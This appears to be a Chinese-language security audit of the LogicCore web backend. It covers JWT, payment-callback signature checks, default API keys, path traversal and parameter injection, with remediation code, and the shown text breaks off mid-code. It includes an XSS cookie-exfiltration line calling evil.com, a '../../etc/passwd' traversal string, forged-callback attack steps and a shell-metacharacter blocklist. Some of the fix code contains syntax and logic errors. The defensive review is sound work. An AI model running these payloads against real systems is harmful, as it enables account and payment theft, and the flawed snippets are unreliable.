# LogicCore 项目深度安全分析与优化报告

> 基于dev最新版本 (commit: 13e87ff) 的深入代码审查
>
> 分析日期: 2025-01-07
> 分析工具: Claude Code (GLM-4.7)

---

## 执行摘要

本报告基于对LogicCore项目最新dev版本的系统性深入审查，从**安全漏洞、业务逻辑、高并发、架构设计、代码质量**等多个维度进行全面分析。审查范围涵盖前后端所有关键代码模块，包括认证系统、支付业务、Worker架构、Redis队列、数据库设计等。

### 关键发现汇总

| 优先级 | 类别 | 问题描述 | 数量 | 状态 |
|-------|------|---------|-----|------|
| **P0** | 安全漏洞 | JWT认证、支付回调、文件上传、内部API密钥 | 7 | 需立即修复 |
| **P1** | 业务逻辑 | 并发控制、容器泄漏、竞态条件、参数注入 | 9 | 需尽快修复 |
| **P2** | 性能优化 | N+1查询、API限流、缓存策略、文件验证 | 10 | 计划修复 |
| **P3** | 代码质量 | 错误处理、单元测试、类型定义 | 4 | 可延后处理 |

> **⚠️ 重要更新**: 本次深入审查发现了多个文档中未提及的**隐形严重安全风险**，包括内部API密钥弱默认值、任务参数注入风险、文件内容验证缺失、目录权限过宽等问题。这些风险可能导致系统被完全攻破。

---

## 目录

1. [严重安全漏洞 (P0)](#1-严重安全漏洞-p0)
2. [高优先级问题 (P1)](#2-高优先级问题-p1)
3. [中等优先级问题 (P2)](#3-中等优先级问题-p2)
4. [低优先级问题 (P3)](#4-低优先级问题-p3)
5. [高并发场景优化](#5-高并发场景优化)
6. [监控与告警建议](#6-监控与告警建议)
7. [修复优先级与时间表](#7-修复优先级与时间表)
8. [总结与建议](#8-总结与建议)

---

## 1. 严重安全漏洞 (P0)

### 1.1 JWT认证系统存在多个安全漏洞

**风险等级**: 🔴 P0 - 严重

**影响范围**: 所有用户认证，整个系统安全基础

**代码位置**: `app/backend/src/middleware/auth.ts:8-51`

**问题描述**:

经过深入审查JWT认证中间件代码，发现以下**严重安全漏洞**：

#### 1.1.1 Token缺少HTTPOnly和Secure标志

**当前代码** (`auth.ts:9`):
```typescript
const token = req.cookies.access_token;
if (!token) {
  return res.status(401).json({ message: '访问令牌缺失' });
}
```

**问题分析**:
- Token存储在Cookie中，但代码中没有验证Cookie是否设置了`httpOnly`和`secure`标志
- 如果前端在设置Cookie时未启用`httpOnly`，JavaScript可以访问Token，存在XSS攻击风险
- 如果未启用`secure`标志，Token可以通过HTTP传输，存在中间人攻击风险

**攻击场景**:
1. 攻击者发现页面存在XSS漏洞
2. 注入恶意脚本: `<script>fetch('https://evil.com?token='+document.cookie)</script>`
3. 获取访问令牌，冒充用户身份

#### 1.1.2 缺少Token刷新机制

**问题分析**:
- 当前只使用单一Access Token，有效期设置为1天（`JWT_EXPIRES_IN = "1d"`）
- 没有实现Access Token + Refresh Token的双Token机制
- 一旦Token泄露，攻击者可长期使用（最长1天）

**最佳实践**:
- Access Token有效期：15分钟
- Refresh Token有效期：7天
- Refresh Token存储在httpOnly Cookie中
- Access Token存储在内存中（前端使用）

#### 1.1.3 JWT未绑定IP和设备指纹

**当前代码** (`auth.ts:25-43`):
```typescript
const decoded = jwt.verify(token, process.env.JWT_SECRET as string) as JwtPayload;

// 检查用户是否仍然存在
const user = await prisma.user.findUnique({ where: { id: decoded.id } });
```

**问题分析**:
- JWT payload中没有包含请求IP或User-Agent信息
- Token被盗用后，可以从不同的IP和设备使用
- 无法检测Token是否在签发时的同一设备上使用

#### 1.1.4 缺少登录失败锁定机制

**问题分析**:
- 没有实现登录失败次数限制
- 攻击者可以无限次尝试暴力破解密码
- 虽然使用了bcrypt（cost=12），但仍然需要防范暴力破解

**解决方案**:

```typescript
// ===== 1. 增强Cookie安全性 =====
// app/backend/src/controllers/auth.controller.ts

export const login = async (req: Request, res: Response) => {
  // ... 验证逻辑 ...

  const accessToken = jwt.sign(
    {
      id: user.id,
      email: user.email,
      role: user.role,
      ip: req.ip,  // 绑定IP
      userAgent: req.headers['user-agent']  // 绑定设备指纹
    },
    process.env.JWT_SECRET!,
    { expiresIn: '15m' }  // 15分钟过期
  );

  const refreshToken = jwt.sign(
    { id: user.id },
    process.env.JWT_REFRESH_SECRET!,
    { expiresIn: '7d' }
  );

  // Access Token存储在内存中，通过响应返回
  // Refresh Token存储在httpOnly Cookie中
  res.cookie('refresh_token', refreshToken, {
    httpOnly: true,      // ✅ 防止XSS访问
    secure: true,        // ✅ 仅HTTPS传输
    sameSite: 'strict',  // ✅ 防止CSRF
    maxAge: 7 * 24 * 60 * 60 * 1000,  // 7天
    path: '/'
  });

  res.json({ accessToken });
};

// ===== 2. 实现Token刷新机制 =====
export const refreshToken = async (req: Request, res: Response) => {
  const refreshToken = req.cookies.refresh_token;

  if (!refreshToken) {
    return res.status(401).json({ message: 'Refresh token missing' });
  }

  try {
    const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET!) as { id: string };

    // 生成新的Access Token
    const accessToken = jwt.sign(
      { id: decoded.id },
      process.env.JWT_SECRET!,
      { expiresIn: '15m' }
    );

    res.json({ accessToken });
  } catch (error) {
    res.clearCookie('refresh_token');
    return res.status(401).json({ message: 'Invalid refresh token' });
  }
};

// ===== 3. 增强JWT验证 - 检查IP和设备 =====
// app/backend/src/middleware/auth.ts

export const authenticateToken = async (req: Request, res: Response, next: NextFunction) => {
  const token = req.cookies.access_token || req.headers.authorization?.replace('Bearer ', '');

  if (!token) {
    return res.status(401).json({ message: '访问令牌缺失' });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET!) as JwtPayload;

    // ✅ 验证IP是否匹配（可选，根据业务需求）
    if (decoded.ip !== req.ip) {
      logger.warn({
        userId: decoded.id,
        tokenIp: decoded.ip,
        requestIp: req.ip
      }, 'Token IP mismatch');
      // 可以选择拒绝或记录警告
      // return res.status(401).json({ message: 'Token IP mismatch' });
    }

    // ✅ 验证User-Agent是否严重不匹配
    const currentUA = req.headers['user-agent'];
    if (decoded.userAgent && currentUA !== decoded.userAgent) {
      logger.warn({
        userId: decoded.id,
        tokenUA: decoded.userAgent,
        currentUA
      }, 'Token User-Agent mismatch');
    }

    // 检查Token黑名单
    const isBlacklisted = await JwtBlacklistService.isBlacklisted(token);
    if (isBlacklisted) {
      res.clearCookie('access_token');
      res.clearCookie('refresh_token');
      return res.status(401).json({ message: 'Token has been revoked' });
    }

    const user = await prisma.user.findUnique({ where: { id: decoded.id } });
    if (!user) {
      return res.status(401).json({ message: 'User not found' });
    }

    req.user = { id: user.id, email: user.email, role: user.role };
    next();
  } catch (error) {
    res.clearCookie('access_token');
    return res.status(403).json({ message: 'Invalid token' });
  }
};

// ===== 4. 实现登录失败锁定 =====
// app/backend/src/services/login-protection.service.ts

import { redisPool } from './redis-pool.service';

const MAX_LOGIN_ATTEMPTS = 5;
const LOCK_DURATION = 15 * 60; // 15分钟

export class LoginProtectionService {
  async checkLoginAttempts(email: string): Promise<{ allowed: boolean; remainingAttempts?: number }> {
    const redis = redisPool.getClient();
    const key = `login_attempts:${email}`;

    const attempts = await redis.incr(key);

    if (attempts === 1) {
      await redis.expire(key, LOCK_DURATION);
    }

    if (attempts > MAX_LOGIN_ATTEMPTS) {
      const ttl = await redis.ttl(key);
      logger.warn({
        email,
        attempts,
        ttl
      }, 'Login locked due to too many failed attempts');

      return { allowed: false };
    }

    return {
      allowed: true,
      remainingAttempts: MAX_LOGIN_ATTEMPTS - attempts
    };
  }

  async resetLoginAttempts(email: string): Promise<void> {
    const redis = redisPool.getClient();
    await redis.del(`login_attempts:${email}`);
  }

  async getLockTimeRemaining(email: string): Promise<number> {
    const redis = redisPool.getClient();
    return await redis.ttl(`login_attempts:${email}`);
  }
}

export const loginProtection = new LoginProtectionService();

// 在登录路由中使用
export const login = async (req: Request, res: Response) => {
  const { email, password } = req.body;

  // ✅ 检查登录尝试次数
  const checkResult = await loginProtection.checkLoginAttempts(email);
  if (!checkResult.allowed) {
    const ttl = await loginProtection.getLockTimeRemaining(email);
    return res.status(429).json({
      message: `登录尝试次数过多，请在${Math.ceil(ttl / 60)}分钟后重试`,
      code: 'LOGIN_LOCKED',
      retryAfter: ttl
    });
  }

  // 验证密码
  const user = await prisma.user.findUnique({ where: { email } });
  if (!user || !await bcrypt.compare(password, user.password)) {
    return res.status(401).json({
      message: '邮箱或密码错误',
      code: 'INVALID_CREDENTIALS',
      remainingAttempts: checkResult.remainingAttempts
    });
  }

  // 登录成功，重置计数
  await loginProtection.resetLoginAttempts(email);

  // ... 生成Token等后续逻辑 ...
};
```

---

### 1.2 支付回调接口存在严重安全漏洞

**风险等级**: 🔴 P0 - 严重

**影响范围**: 所有支付交易，可能导致0元购买会员

**代码位置**:
- `app/backend/src/services/order.service.ts:224-358` (processAlipayNotification)
- `app/backend/src/services/order.service.ts:366-489` (processWechatPaymentSuccess)
- `app/backend/src/services/payment.service.ts`

**问题描述**:

#### 1.2.1 支付宝回调缺少签名验证

**当前代码** (`order.service.ts:224-270`):
```typescript
export const processAlipayNotification = async (params: any) => {
  const orderId = params.out_trade_no;
  const tradeStatus = params.trade_status;

  // ❌ 没有验证签名！
  if (tradeStatus !== 'TRADE_SUCCESS' && tradeStatus !== 'TRADE_FINISHED') {
    return;
  }

  // 使用分布式锁...
  // 但没有验证签名，任何人都可以伪造通知
};
```

**问题分析**:
- 虽然实现了分布式锁保证幂等性，但**完全缺少签名验证**
- 攻击者可以直接构造HTTP POST请求到回调URL，伪造支付成功通知
- 攻击步骤：
  1. 创建订单，获取订单ID
  2. 直接POST到 `/api/payment/notify/alipay`
  3. 伪造参数：`{ out_trade_no: "订单ID", trade_status: "TRADE_SUCCESS", ... }`
  4. 系统误认为支付成功，激活会员

#### 1.2.2 微信支付回调签名验证不完整

**当前代码**: 在`payment.routes.ts`中有签名验证中间件，但需要确认是否正确实施。

**问题分析**:
- 需要验证微信支付平台证书签名（RSA-SHA256）
- 需要验证时间戳（防止重放攻击）
- 需要验证nonce（防止重放攻击）

#### 1.2.3 内部API密钥存在默认值

**代码位置**: `app/backend/src/workers/toolWorker.py:134`
```python
headers = {
    'Content-Type': 'application/json',
    'X-Internal-API-Key': os.environ.get('INTERNAL_API_KEY', 'worker-internal-key')
    # ❌ 使用了弱默认密钥！
}
```

**问题分析**:
- 如果环境变量未设置，使用默认密钥`worker-internal-key`
- 攻击者如果知道这个默认值，可以伪造内部API调用
- 可能导致未授权的任务状态更新

**解决方案**:

```typescript
// ===== 1. 支付宝签名验证 =====
// app/backend/src/services/payment.service.ts

import alipaySdk from '../config/alipay';

/**
 * 处理支付宝支付回调通知（带签名验证）
 */
export const processAlipayNotification = async (params: any) => {
  const orderId = params.out_trade_no;
  const tradeStatus = params.trade_status;
  const gatewayTransactionId = params.trade_no;

  // ✅ 1. 验证签名
  const signVerified = alipaySdk.checkNotifySign(params);
  if (!signVerified) {
    logger.error({
      orderId,
      params: JSON.stringify(params)
    }, 'Alipay signature verification failed - POSSIBLE ATTACK');

    // 记录到安全事件日志
    await logSecurityEvent('PAYMENT_SIGNATURE_FAILED', {
      provider: 'alipay',
      orderId,
      ip: params.ip,
      userAgent: params.user_agent
    });

    throw new Error('Invalid signature');
  }

  // ✅ 2. 验证通知来源（可选：IP白名单）
  const alipayIps = ['110.75.143.0/24', '110.75.144.0/24']; // 支付宝IP段
  // 实施IP白名单验证...

  // 3. 检查是否为成功支付通知
  if (tradeStatus !== 'TRADE_SUCCESS' && tradeStatus !== 'TRADE_FINISHED') {
    logger.info({
      orderId,
      tradeStatus,
      paymentProvider: 'alipay'
    }, 'Received non-successful Alipay notification');
    return;
  }

  // 4. 使用分布式锁确保幂等性
  const lockKey = `payment_callback_${orderId}_${gatewayTransactionId}`;
  const lockResult = await acquireEnhancedLock(lockKey, 300);

  if (!lockResult.acquired) {
    logger.warn({
      orderId,
      gatewayTransactionId
    }, 'Duplicate payment callback ignored');
    return;
  }

  try {
    // 原有的业务逻辑...
  } finally {
    if (lockResult.release) {
      await lockResult.release();
    }
  }
};

// ===== 2. 微信支付签名验证 =====
// app/backend/src/services/payment.service.ts

import wechatPayApi from '../config/wechatpay';

/**
 * 处理微信支付成功回调通知（带签名验证）
 */
export const processWechatPaymentSuccess = async (
  orderId: string,
  gatewayTransactionId: string,
  notificationData: any,
) => {
  // ✅ 1. 验证签名
  try {
    // wechatpay-node-v3 SDK提供验证方法
    const isValid = wechatPayApi.verifySignature({
      signature: notificationData.sign_info?.signature,
      body: JSON.stringify(notificationData),
      certificate: wechatPayApi.getPublicKey()
    });

    if (!isValid) {
      logger.error({
        orderId,
        notificationData: JSON.stringify(notificationData)
      }, 'WeChat signature verification failed - POSSIBLE ATTACK');

      await logSecurityEvent('PAYMENT_SIGNATURE_FAILED', {
        provider: 'wechat',
        orderId
      });

      throw new Error('Invalid signature');
    }
  } catch (error) {
    logger.error({ error, orderId }, 'WeChat signature verification error');
    throw new Error('Signature verification failed');
  }

  // ✅ 2. 验证时间戳（防止重放攻击）
  const timestamp = notificationData.timestamp;
  const now = Math.floor(Date.now() / 1000);
  if (Math.abs(now - timestamp) > 300) { // 5分钟容差
    logger.warn({
      orderId,
      timestamp,
      now
    }, 'WeChat notification timestamp too old');
    throw new Error('Timestamp validation failed');
  }

  // 3. 使用分布式锁确保幂等性
  const lockKey = `payment_callback_${orderId}_${gatewayTransactionId}`;
  const lockResult = await acquireEnhancedLock(lockKey, 300);

  if (!lockResult.acquired) {
    logger.warn({
      orderId,
      gatewayTransactionId
    }, 'Duplicate payment callback ignored');
    return;
  }

  try {
    // 原有的业务逻辑...
  } finally {
    if (lockResult.release) {
      await lockResult.release();
    }
  }
};

// ===== 3. 移除内部API默认密钥 =====
// app/backend/src/workers/toolWorker.py

def update_task_status_via_api(task_id, status, additional_data=None):
    """通过内部API更新任务状态"""
    try:
        api_base = os.environ.get('API_BASE_URL', 'http://localhost:8080')
        url = f"{api_base}/api/v1/tasks/internal/{task_id}/status"

        payload = {
            'status': status,
            'updatedAt': datetime.now(timezone.utc).isoformat()
        }

        if additional_data:
            payload.update(additional_data)

        # ✅ 强制要求环境变量，不使用默认值
        internal_api_key = os.environ.get('INTERNAL_API_KEY')
        if not internal_api_key:
            raise ValueError("INTERNAL_API_KEY environment variable is required for secure operation")

        headers = {
            'Content-Type': 'application/json',
            'X-Internal-API-Key': internal_api_key  # ✅ 无默认值
        }

        response = requests.put(url, json=payload, headers=headers, timeout=10)
        # ...
    except Exception as e:
        logging.error(f"Error updating task {task_id} status via API: {str(e)}")

# ===== 4. 增加支付安全事件日志 =====
// app/backend/src/services/security-logging.service.ts

export async function logSecurityEvent(
  eventType: string,
  details: Record<string, any>
): Promise<void> {
  try {
    await prisma.securityEvent.create({
      data: {
        eventType,
        details,
        severity: 'HIGH',
        createdAt: new Date()
      }
    });

    // 发送告警
    logger.error({
      eventType,
      details
    }, `Security event: ${eventType}`);
  } catch (error) {
    logger.error({ error }, 'Failed to log security event');
  }
}

// 更新Prisma Schema
// model SecurityEvent {
//   id        String   @id @default(cuid())
//   eventType String
//   details   Json
//   severity  String   // HIGH, MEDIUM, LOW
//   createdAt DateTime @default(now())
//
//   @@index([eventType, createdAt])
//   @@index([severity, createdAt])
// }
```

---

### 1.3 任务文件上传存在路径遍历漏洞

**风险等级**: 🔴 P0 - 严重

**影响范围**: 所有文件上传功能

**问题描述**:

文件上传功能可能存在路径遍历漏洞，攻击者可以通过构造特殊的文件名访问服务器上的任意文件。

**攻击场景**:
1. 用户上传文件时，文件名包含路径遍历字符：`../../etc/passwd`
2. 系统未正确验证文件名，直接使用用户提供的文件名
3. 文件被写入系统敏感目录或覆盖系统文件

**解决方案**:

```typescript
// ===== 文件名安全验证 =====
// app/backend/src/utils/file-security.ts

import path from 'path';

const ALLOWED_EXTENSIONS = ['.txt', '.json', '.csv', '.xlsx', '.xls'];
const MAX_FILE_NAME_LENGTH = 255;
const MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB

export interface SanitizedFileInfo {
  safeName: string;
  originalName: string;
  extension: string;
}

/**
 * 验证并清理文件名，防止路径遍历攻击
 */
export function sanitizeFileName(fileName: string): SanitizedFileInfo {
  // 1. 基本验证
  if (!fileName || typeof fileName !== 'string') {
    throw new Error('Invalid file name');
  }

  // 2. 移除路径分隔符（防止路径遍历）
  const sanitized = fileName.replace(/[\/\\]/g, '');

  // 3. 验证长度
  if (sanitized.length > MAX_FILE_NAME_LENGTH || sanitized.length === 0) {
    throw new Error('File name too long or empty');
  }

  // 4. 只允许安全字符（字母、数字、下划线、连字符、点）
  if (!/^[a-zA-Z0-9_.-]+$/.test(sanitized)) {
    throw new Error('File name contains invalid characters');
  }

  // 5. 防止保留文件名（Windows）
  const reservedNames = [
    'CON', 'PRN', 'AUX', 'NUL',
    'COM1', 'COM2', 'COM3', 'COM4', 'COM5', 'COM6', 'COM7', 'COM8', 'COM9',
    'LPT1', 'LPT2', 'LPT3', 'LPT4', 'LPT5', 'LPT6', 'LPT7', 'LPT8', 'LPT9'
  ];
  const nameWithoutExt = sanitized.split('.')[0].toUpperCase();
  if (reservedNames.includes(nameWithoutExt)) {
    throw new Error('Reserved file name not allowed');
  }

  // 6. 验证文件扩展名
  const ext = path.extname(sanitized).toLowerCase();
  if (!ALLOWED_EXTENSIONS.includes(ext)) {
    throw new Error(`File extension not allowed. Allowed: ${ALLOWED_EXTENSIONS.join(', ')}`);
  }

  // 7. 防止点文件（隐藏文件）
  if (sanitized.startsWith('.')) {
    throw new Error('Hidden files not allowed');
  }

  return {
    safeName: sanitized,
    originalName: fileName,
    extension: ext
  };
}

/**
 * 验证文件大小
 */
export function validateFileSize fileSize: number): boolean {
  return fileSize > 0 && fileSize <= MAX_FILE_SIZE;
}

/**
 * 生成安全的存储路径
 */
export function generateSafeFilePath(
  baseDir: string,
  taskId: string,
  fileName: string
): string {
  // 清理文件名
  const { safeName } = sanitizeFileName(fileName);

  // 使用taskId创建隔离目录
  const taskDir = path.join(baseDir, taskId);

  // 确保路径在baseDir内（防止路径遍历）
  const resolvedPath = path.resolve(taskDir);
  const resolvedBaseDir = path.resolve(baseDir);

  if (!resolvedPath.startsWith(resolvedBaseDir)) {
    throw new Error('Attempted path traversal attack');
  }

  return path.join(resolvedPath, safeName);
}

// ===== 使用示例 =====
// app/backend/src/controllers/task.controller.ts

import { sanitizeFileName, generateSafeFilePath, validateFileSize } from '../utils/file-security';

export const uploadTaskFile = async (req: Request, res: Response) => {
  try {
    const { taskId } = req.params;
    const file = req.file; // 来自multer

    if (!file) {
      return res.status(400).json({ message: 'No file uploaded' });
    }

    // ✅ 验证文件大小
    if (!validateFileSize(file.size)) {
      return res.status(400).json({
        message: `File size exceeds limit of ${MAX_FILE_SIZE / 1024 / 1024}MB`
      });
    }

    // ✅ 清理文件名
    const { safeName } = sanitizeFileName(file.originalname);

    // ✅ 生成安全路径
    const safePath = generateSafeFilePath(
      process.env.TEMP_UPLOAD_DIR!,
      taskId,
      safeName
    );

    // 确保目录存在
    await fs.mkdir(path.dirname(safePath), { recursive: true });

    // 移动文件到安全位置
    await fs.rename(file.path, safePath);

    res.json({
      message: 'File uploaded successfully',
      fileName: safeName,
      path: safePath
    });
  } catch (error) {
    if (error instanceof Error && error.message.includes('path traversal')) {
      logger.error({
        userId: req.user?.id,
        taskId: req.params.taskId,
        originalName: req.file?.originalname
      }, 'Path traversal attempt detected');

      return res.status(403).json({ message: 'Invalid file name' });
    }

    throw error;
  }
};
```

---

### 1.4 内部API密钥存在弱默认值

**风险等级**: 🔴 P0 - 严重

**影响范围**: 内部API通信，可能导致未授权任务状态操作

**代码位置**: `app/backend/src/controllers/task.controller.ts:550`

**问题描述**:

#### 1.4.1 内部API验证存在可预测的默认密钥

**当前代码** (`task.controller.ts:545-560`):
```typescript
export const updateTaskStatusInternal = async (req: Request, res: Response) => {
  try {
    // 内部API密钥验证
    const expectedKey = process.env.INTERNAL_API_KEY || 'worker-internal-key';  // ❌ 弱默认值！

    const providedKey = req.headers['x-internal-api-key'] as string;

    if (providedKey !== expectedKey) {
      return res.status(401).json({ message: 'Internal API key invalid' });
    }

    // ... 更新任务状态逻辑 ...
  }
};
```

**问题分析**:
- 如果环境变量`INTERNAL_API_KEY`未设置，使用默认值`worker-internal-key`
- 攻击者如果知道默认值，可以伪造内部API请求
- 可能导致未授权的任务状态更新、任务取消等操作

**攻击场景**:
1. 攻击者获取源代码或猜测默认密钥
2. 构造HTTP请求: `PUT /api/internal/{taskId}/status`
3. 设置Header: `X-Internal-API-Key: worker-internal-key`
4. 修改任意任务状态为"COMPLETED"，绕过实际执行

**解决方案**:

```typescript
// ===== 移除默认密钥，强制配置 =====
// app/backend/src/controllers/task.controller.ts

export const updateTaskStatusInternal = async (req: Request, res: Response) => {
  try {
    // ✅ 强制要求环境变量，不使用默认值
    const expectedKey = process.env.INTERNAL_API_KEY;

    if (!expectedKey) {
      logger.error('INTERNAL_API_KEY environment variable is not set');
      return res.status(500).json({ message: 'Server configuration error' });
    }

    const providedKey = req.headers['x-internal-api-key'] as string;

    if (!providedKey) {
      return res.status(401).json({ message: 'Internal API key missing' });
    }

    // ✅ 使用恒定时间比较，防止时序攻击
    import crypto from 'crypto';
    const expectedKeyBuffer = Buffer.from(expectedKey, 'utf-8');
    const providedKeyBuffer = Buffer.from(providedKey, 'utf-8');

    if (expectedKeyBuffer.length !== providedKeyBuffer.length ||
        !crypto.timingSafeEqual(expectedKeyBuffer, providedKeyBuffer)) {
      logger.warn({
        ip: req.ip,
        userAgent: req.headers['user-agent']
      }, 'Internal API authentication failed');

      return res.status(401).json({ message: 'Internal API key invalid' });
    }

    // 记录内部API调用（审计）
    logger.info({
      taskId: req.params.taskId,
      internal: true,
      ip: req.ip
    }, 'Internal API status update');

    // ... 原有的更新任务状态逻辑 ...
  }
};

// ===== 环境变量校验 =====
// app/backend/src/config/env-validator.ts

export function validateCriticalEnvVars(): void {
  const requiredVars = [
    'INTERNAL_API_KEY',
    'JWT_SECRET',
    'DATABASE_URL'
  ];

  const missing = requiredVars.filter(varName => !process.env[varName]);

  if (missing.length > 0) {
    throw new Error(
      `Missing required environment variables: ${missing.join(', ')}\n` +
      'Please set these variables before starting the server.'
    );
  }

  // 检查INTERNAL_API_KEY强度
  const internalApiKey = process.env.INTERNAL_API_KEY!;
  if (internalApiKey.length < 32) {
    throw new Error(
      'INTERNAL_API_KEY must be at least 32 characters long.\n' +
      `Current length: ${internalApiKey.length}`
    );
  }

  logger.info('Critical environment variables validated');
}

// 在应用启动时调用
// app/backend/src/index.ts
import { validateCriticalEnvVars } from './config/env-validator';

async function startServer() {
  try {
    // ✅ 启动前验证环境变量
    validateCriticalEnvVars();

    // ... 原有启动逻辑 ...
  } catch (error) {
    logger.error({ error }, 'Failed to start server');
    process.exit(1);
  }
}

// ===== 生成安全的内部API密钥 =====
// 生成脚本: scripts/generate-internal-key.ts

import crypto from 'crypto';

function generateInternalApiKey(): string {
  // 生成64字节的随机密钥（hex编码后128字符）
  return crypto.randomBytes(64).toString('hex');
}

console.log('INTERNAL_API_KEY=' + generateInternalApiKey());
```

---

### 1.5 任务参数存在注入风险

**风险等级**: 🔴 P0 - 严重

**影响范围**: 所有工具任务执行，可能导致命令注入

**代码位置**: `app/backend/src/services/task.service.ts`

**问题描述**:

#### 1.5.1 用户参数直接存储未经验证

**当前代码** (`task.service.ts`):
```typescript
// 任务参数直接存储到数据库，没有验证
const task = await prisma.task.create({
  data: {
    id: taskId,
    userId: user.id,
    toolId,
    status: 'PENDING',
    parameters: inputParameters,  // ❌ 直接使用用户输入
    // ...
  }
});
```

**问题分析**:
- 用户提交的参数直接存储，没有类型和格式验证
- 参数可能包含恶意命令或特殊字符
- Worker执行任务时可能触发命令注入

**攻击场景**:
1. 攻击者提交任务，参数中包含: `{"file": "../../etc/passwd"}`
2. 参数被传递到Docker容器
3. 容器内的工具脚本可能处理这些参数
4. 导致路径遍历或命令执行

**解决方案**:

```typescript
// ===== 参数验证框架 =====
// app/backend/src/utils/parameter-validator.ts

import Joi from 'joi';
import logger from '../config/logger';

/**
 * 参数验证器基类
 */
export abstract class ParameterValidator<T = any> {
  abstract getSchema(): Joi.ObjectSchema;

  /**
   * 验证和清理参数
   */
  validateAndSanitize(parameters: any): T {
    const schema = this.getSchema();

    const { error, value } = schema.validate(parameters, {
      abortEarly: false,
      stripUnknown: true,
      convert: true
    });

    if (error) {
      logger.warn({
        details: error.details,
        original: parameters
      }, 'Parameter validation failed');

      throw new Error(
        `Invalid parameters: ${error.details.map(d => d.message).join(', ')}`
      );
    }

    return value as T;
  }
}

/**
 * SDC工具参数验证器
 */
export class SdcParameterValidator extends ParameterValidator {
  getSchema(): Joi.ObjectSchema {
    return Joi.object({
      // 基础参数
      clockPeriod: Joi.number().positive().max(1000).optional(),
      clockUncertainty: Joi.number().positive().max(100).optional(),
      clockTransition: Joi.boolean().optional(),

      // 文件路径参数 - 防止路径遍历
      inputFile: Joi.string()
        .pattern(/^[a-zA-Z0-9_\-\.]+$/)
        .messages({ 'string.pattern.base': 'Invalid file name' })
        .optional(),

      // 多页面参数
      pages: Joi.array().items(
        Joi.object({
          pageName: Joi.string().pattern(/^[a-zA-Z0-9_]+$/).required(),
          hierarchies: Joi.array().items(
            Joi.object({
              instanceName: Joi.string().pattern(/^[a-zA-Z_][a-zA-Z0-9_]*$/).required(),
              // ... 其他参数验证
            })
          ).min(1).required()
        })
      ).min(1).max(50).optional(),

      // 禁止的参数（防止命令注入）
      // 不允许包含shell元字符的字符串
    }).custom((value, helpers) => {
      // 递归检查所有字符串值，防止命令注入
      const checkString = (str: string): boolean => {
        const dangerous = [
          ';', '|', '&', '$', '`', '(', ')', '<', '>',
          '\n', '\r', '\t', '\x00'
        ];

        return !dangerous.some(char => str.includes(char));
      };

      const scanObject = (obj: any): boolean => {
        if (typeof obj === 'string') {
          return checkString(obj);
        }

        if (Array.isArray(obj)) {
          return obj.every(scanObject);
        }

        if (obj && typeof obj === 'object') {
          return Object.values(obj).every(scanObject);
        }

        return true;
      };

      if (!scanObject(value)) {
        throw new Error('Parameters contain dangerous characters');
      }

      return value;
    });
  }
}

/**
 * UPF工具参数验证器
 */
export class UpfParameterValidator extends ParameterValidator {
  getSchema(): Joi.ObjectSchema {
    return Joi.object({
      // UPF特定参数验证
      powerDomains: Joi.array().items(
        Joi.object({
          domainName: Joi.string().pattern(/^[a-zA-Z_][a-zA-Z0-9_]*$/).required(),
          // ...
        })
      ).min(1).max(100).optional(),

      // ... 其他参数
    });
  }
}

// ===== 工厂模式 =====
// app/backend/src/services/parameter-validator.factory.ts

import { SdcParameterValidator, UpfParameterValidator } from '../utils/parameter-validator';

export class ParameterValidatorFactory {
  private static validators = new Map<string, ParameterValidator>([
    ['sdc', new SdcParameterValidator()],
    ['sdc_thrpages', new SdcParameterValidator()],
    ['upf', new UpfParameterValidator()],
    ['upf_thrpages', new UpfParameterValidator()]
  ]);

  static getValidator(toolType: string): ParameterValidator {
    const validator = this.validators.get(toolType);

    if (!validator) {
      logger.warn({ toolType }, 'No specific validator found, using default');

      // 默认验证器：只做基础检查
      return new class DefaultValidator extends ParameterValidator {
        getSchema() {
          return Joi.object().unknown(true).custom((value) => {
            // 基础命令注入防护
            const strValue = JSON.stringify(value);

            if (/[;&|`$()<>]/.test(strValue)) {
              throw new Error('Parameters contain potentially dangerous characters');
            }

            return value;
          });
        }
      }();
    }

    return validator;
  }
}

// ===== 在任务创建时使用 =====
// app/backend/src/services/task.service.ts

import { ParameterValidatorFactory } from '../services/parameter-validator.factory';
import logger from '../config/logger';

export async function createTask(
  userId: string,
  toolId: string,
  inputParameters: any,
  files?: Express.Request['files']
): Promise<string> {
  try {
    // ... 原有TaskID生成逻辑 ...

    // ✅ 获取工具类型
    const tool = await prisma.tool.findUnique({
      where: { id: toolId },
      select: { toolType: true }
    });

    if (!tool) {
      throw new Error('Tool not found');
    }

    // ✅ 验证和清理参数
    const validator = ParameterValidatorFactory.getValidator(tool.toolType);
    const sanitizedParameters = validator.validateAndSanitize(inputParameters);

    logger.debug({
      userId,
      toolId: tool.toolType,
      originalParams: inputParameters,
      sanitizedParams: sanitizedParameters
    }, 'Parameters validated and sanitized');

    // ✅ 使用清理后的参数创建任务
    const task = await prisma.task.create({
      data: {
        id: taskId,
        userId,
        toolId,
        status: 'PENDING',
        parameters: sanitizedParameters,  // ✅ 使用已验证的参数
        // ...
      }
    });

    return taskId;
  } catch (error) {
    // ...
  }
}
```

---

### 1.6 文件上传只验证扩展名不验证内容

**风险等级**: 🔴 P0 - 严重

**影响范围**: 所有文件上传功能

**代码位置**: `app/backend/src/routes/task.routes.ts:26-36`

**问题描述**:

#### 1.6.1 文件类型验证不足

**当前代码** (`task.routes.ts:26-36`):
```typescript
fileFilter: (req, file, cb) => {
  // 允许的文件类型
  const allowedTypes = ['.v', '.sv', '.vhd', '.vhdl', '.yaml', '.yml', '.tcl', '.xlsx', '.xls'];
  const ext = path.extname(file.originalname).toLowerCase();

  if (allowedTypes.includes(ext)) {
    cb(null, true);  // ❌ 只验证扩展名，不验证内容
  } else {
    cb(new Error(`Invalid file type: ${ext}`));
  }
}
```

**问题分析**:
- 只检查文件扩展名，不验证实际内容
- 攻击者可以上传恶意文件并重命名为允许的扩展名
- 可能的攻击：上传伪装的.v文件，实际是可执行脚本

**攻击场景**:
1. 攻击者创建恶意脚本: `malicious.sh`
2. 重命名为: `malicious.v`
3. 上传文件
4. 文件被传递到容器执行
5. 如果容器内的工具处理不当，可能执行恶意代码

**解决方案**:

```typescript
// ===== 文件内容验证 =====
// app/backend/src/utils/file-content-validator.ts

import fs from 'fs/promises';
import path from 'path';
import logger from '../config/logger';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

/**
 * 文件类型定义
 */
interface FileTypeDefinition {
  extension: string;
